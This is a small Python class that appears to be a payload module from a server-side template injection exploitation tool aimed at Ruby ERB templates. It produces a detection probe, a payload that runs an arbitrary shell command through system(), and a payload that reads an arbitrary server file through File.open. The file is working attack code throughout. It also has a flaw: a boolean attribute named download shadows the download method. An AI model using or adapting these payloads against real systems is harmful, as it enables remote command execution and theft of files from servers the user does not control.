class ruby:
    def __init__(self):
        self.name = "ruby"
        self.exec = True
        self.download = True

    def payload_test(self):
        return ["<%= 347 * 21 %>"]


    def execu(self,cmd,index=-1):
        payload = [
        '<%= system("'+cmd+'") %>'
        ]
        if index >= 0:
            return payload[index]
        return payload


    def download(self,cmd,index=-1):
        payload = [
        '<%= File.open("'+cmd+'").read %>'
        ]
        if index >= 0:
            return payload[index]
        return payload


